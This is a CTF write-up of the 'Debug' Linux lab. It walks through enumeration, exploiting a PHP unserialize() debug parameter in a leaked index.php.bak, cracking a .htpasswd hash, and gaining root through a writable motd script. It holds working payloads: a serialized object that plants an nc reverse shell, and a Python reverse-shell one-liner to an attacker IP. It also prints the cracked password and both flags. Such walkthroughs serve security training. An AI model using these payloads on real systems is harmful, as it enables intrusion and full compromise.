# Debug

Linux Machine CTF! You'll learn about enumeration, finding hidden password files and how to exploit php deserialization!

# User flag

## Open ports

Nmap reveals 2 open ports:

~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:ee:1e:ba:07:2a:54:69:ff:11:e3:49:d7:db:a9:01 (RSA)
|   256 8b:2a:8f:d8:40:95:33:d5:fa:7a:40:6a:7f:29:e4:03 (ECDSA)
|_  256 65:59:e4:40:2a:c2:d7:05:77:b3:af:60:da:cd:fc:67 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Web enumeration

Gobuster reveals a hidden `/backup` folder:

~~~
┌──(kali㉿kali)-[/data/Debug]
└─$ gobuster dir -u http://10.10.196.165 -x php,txt,bak,old,htm,html,zip,tar -w /usr/share/wordlists/dirb/common.txt

[REDACTED]

/backup               (Status: 301) [Size: 315] [--> http://10.10.196.165/backup/]
/grid                 (Status: 301) [Size: 313] [--> http://10.10.196.165/grid/]  
/index.html           (Status: 200) [Size: 11321]                                 
/index.php            (Status: 200) [Size: 5732]                                  
/index.php            (Status: 200) [Size: 5732]                                  
/index.html           (Status: 200) [Size: 11321]                                 
/javascripts          (Status: 301) [Size: 320] [--> http://10.10.196.165/javascripts/]
/javascript           (Status: 301) [Size: 319] [--> http://10.10.196.165/javascript/] 
/message.txt          (Status: 200) [Size: 282]                                        
/server-status        (Status: 403) [Size: 278]                                        
                                                                                       
===============================================================
2021/05/19 15:51:08 Finished
===============================================================
~~~

## The index.php.bak file

Browsing this directory in a browser will show several files, one of which being a backup of `index.php`.

```php
┌──(kali㉿kali)-[/data/Debug/files]
└─$ curl -s http://10.10.196.165/backup/index.php.bak
<!doctype html>
<html lang="en" class="no-js">
<head>
  <meta charset="utf-8">
  <title>Base</title>
  <meta name="description" content="">
  <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
  <link rel="stylesheet" media="screen" href="style.css">
</head>
<body>

<div class="container">


[REDACTED]


  <form action="" method="get">
    <fieldset>
      <legend>Form Submit (Your message will be saved on the server and will be reviewed later by our administrators)</legend>
      <div class="field">
        <label for="name">Field Name</label>
        <input type="text" name="name" id="name">
      </div>
      <div class="field">
        <label for="email">Email Field</label>
        <input type="text" name="email" id="email">
      </div>
      <div class="field">
        <label for="textarea">Textarea</label>
        <textarea rows="10" cols="30" name="comments" id="comments"></textarea>
      </div>


[REDACTED]


      <div class="field">
        <input class="button" type="submit" value="Submit">
        <input class="button" type="reset" value="Reset">
      </div>
    </fieldset>
  </form>

<?php

class FormSubmit {

  public $form_file = 'message.txt';
  public $message = '';

  public function SaveMessage() {

    $NameArea = $_GET['name']; 
    $EmailArea = $_GET['email'];
    $TextArea = $_GET['comments'];

    $this-> message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";

  }

  public function __destruct() {

    file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
    echo 'Your submission has been successfully saved!';

  }

}

// Leaving this for now... only for debug purposes... do not touch!

$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);

$application = new FormSubmit;
$application -> SaveMessage();


?>


[REDACTED]


<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
<script src="javascripts/default.js"></script>

</body>
</html>
```

What is interesting in this code is that the `__destruct` function of the `FormSubmit` class is creating the file mentionned in the `$form_file` variable, with the content of the `$message` variable.

However, there is a hidden `debug` parameter in the code, which is passed to the `unserialize` function, which we can abuse, as shown below. 

## PHP serialization exploit

As explained by [OWASP](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection), "since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope". This is explained here: https://notsosecure.com/remote-code-execution-via-php-unserialize/.

Let's first create the following PHP code:

```php
┌──(kali㉿kali)-[/data/Debug/files]
└─$ cat shell.php
<?php
class FormSubmit {
  public $form_file = 'shell.php';
  public $message = '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.50.72 4444 >/tmp/f"); ?>';
}
$oForm = new FormSubmit;
echo urlencode(serialize($oForm));
?>
```

Now, let's pass the resulting payload to the `debug` variable of the `index.php` page. It will create a `shell.php` file on the server, with the content we put in the `$message` variable.

~~~
┌──(kali㉿kali)-[/data/Debug/files]
└─$ curl -s http://10.10.196.165/index.php?debug=`php shell.php`
~~~

Now, start a listener (`nc -nlvp 4444`) and browse `shell.php`:

~~~
┌──(kali㉿kali)-[/data/Debug/files]
└─$ curl -s http://10.10.196.165/shell.php
~~~

## James password

We now have a reverse shell. We can't access `james`' home folder to get the user flag. But analyzing the files in the web directory shows a `.htpasswd` file, with a hash, which may be `james`' password.

~~~
www-data@osboxes:/var/www/html$ cat .htpasswd
cat .htpasswd
james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1
~~~

Let's crack the hash:

~~~
┌──(kali㉿kali)-[/data/Debug/files]
└─$ /data/src/john/run/john james.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
jamaica          (james)
1g 0:00:00:00 DONE (2021-05-20 14:58) 50.00g/s 38400p/s 38400c/s 38400C/s evelyn..james1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
~~~

## User flag

We can now connect as `james` via SSH directly, with the password `jamaica`. Let's get the user flag

~~~
james@osboxes:~$ cat user.txt
7e37c84a66cc40b1c6bf700d08d28c20
~~~

User flag: `7e37c84a66cc40b1c6bf700d08d28c20`

# Root flag

## Message from root

It seems that `root` has left a message to `james`:

~~~
james@osboxes:~$ cat Note-To-James.txt 
Dear James,

As you may already know, we are soon planning to submit this machine to THM's CyberSecurity Platform! Crazy... Isn't it? 

But there's still one thing I'd like you to do, before the submission.

Could you please make our ssh welcome message a bit more pretty... you know... something beautiful :D

I gave you access to modify all these files :) 

Oh and one last thing... You gotta hurry up! We don't have much time left until the submission!

Best Regards,

root
~~~

## The motd service

There are several ways to make this banner. Let's have a look at files we can modify in `/etc/`:

~~~
james@osboxes:~$ find /etc -type f -writable -exec ls -l {} + 2>/dev/null
-rwxrwxr-x 1 root james 1220 Mar 10 18:32 /etc/update-motd.d/00-header
-rwxrwxr-x 1 root james    0 Mar 10 18:38 /etc/update-motd.d/00-header.save
-rwxrwxr-x 1 root james 1157 Jun 14  2016 /etc/update-motd.d/10-help-text
-rwxrwxr-x 1 root james   97 Dec  7  2018 /etc/update-motd.d/90-updates-available
-rwxrwxr-x 1 root james  299 Jul 22  2016 /etc/update-motd.d/91-release-upgrade
-rwxrwxr-x 1 root james  142 Dec  7  2018 /etc/update-motd.d/98-fsck-at-reboot
-rwxrwxr-x 1 root james  144 Dec  7  2018 /etc/update-motd.d/98-reboot-required
-rwxrwxr-x 1 root james  604 Nov  5  2017 /etc/update-motd.d/99-esm
~~~

The motd service (Message of the Day) is used to display messages when a user connects, and will be run by `root`. As we have write access, we can add a reverse shell command:

~~~
james@osboxes:~$ cat >> /etc/update-motd.d/00-header << EOF
> /usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.50.72",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
> EOF
~~~

## Reverse shell and root flag

Now, start a listener (`nc -nlvp 4444`), disconnect from the SSH session and reconnect. A root shell is spawned to the listener window.

~~~
┌──(kali㉿kali)-[/data/Debug/files]
└─$ nc -nlvp 4444 
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.196.165] 59084
bash: cannot set terminal process group (1373): Inappropriate ioctl for device
bash: no job control in this shell
root@osboxes:/# cat /root/root.txt
cat /root/root.txt
3c8c3d0fe758c320d158e32f68fabf4b
~~~

Root flag: `3c8c3d0fe758c320d158e32f68fabf4b`
